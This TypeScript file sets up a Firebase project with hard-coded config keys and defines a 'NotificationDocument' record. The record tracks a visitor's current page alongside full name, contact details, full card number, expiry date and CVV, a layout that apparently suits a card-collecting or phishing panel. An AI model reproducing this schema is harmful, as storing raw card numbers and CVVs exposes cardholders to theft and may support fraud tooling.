import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyCVuDP2-RaK509rdoZUGarOkdBb4CpT_f8",
  authDomain: "neewtaminsss.firebaseapp.com",
  projectId: "neewtaminsss",
  storageBucket: "neewtaminsss.firebasestorage.app",
  messagingSenderId: "873192027415",
  appId: "1:873192027415:web:724aafce2bcdbdb8e73352",
  measurementId: "G-JB0KP1FZH4"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

